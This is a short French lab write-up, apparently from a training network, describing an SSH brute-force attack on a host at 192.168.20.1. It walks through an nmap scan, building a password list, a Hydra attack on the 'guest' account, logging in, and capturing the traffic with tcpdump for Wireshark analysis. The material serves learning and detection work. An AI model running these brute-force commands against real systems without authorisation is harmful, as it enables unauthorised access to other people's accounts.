# **Attaque en Brute Force via SSH**

## **1. Informations sur le scénario**
- **IP de la cible** : 192.168.20.1 (**Guest1Zone2**)
- **IP de l'attaquant** : 192.168.30.3 (**Guest1Zone3**)
- **Port ciblé** : 22 (SSH)

## **2. Scan de la cible**
- **Commande utilisée** : `nmap -p 22 192.168.20.1`


## **3. Création d'une liste de mots de passe**
- **Commande utilisée** :
  ```bash
  touch hydra.txt
  nano hydra.txt 
  ```
  et ensuite crée toute une liste de "potentiel mdp"

## **4. Brute Force avec Hydra**
- **Commande utilisée** :
  ```bash
  hydra -l guest -P hydra.txt 192.168.20.1 ssh
  ```

  - Hydra tente de se connecter en SSH avec chaque mot de passe du fichier `hydra.txt`.
  - Une fois le bon mot de passe trouvé, il l'affiche.
  
## **5. Connexion en SSH à la cible**
- **Commande utilisée** :
  ```bash
  ssh guest@192.168.20.1
  ```
- **Effet** : Accès au terminal distant de **Guest1Zone2** avec le mot de passe découvert.

## **6. Capture du trafic SSH pour analyse**
- **Sur la cible (Guest1Zone2)** :
  ```bash
  tcpdump -i ens3 port 22 -w bruteforce_ssh.pcap
  ```
- **Effet** : Capture les tentatives de connexion SSH pour analyse dans Wireshark.
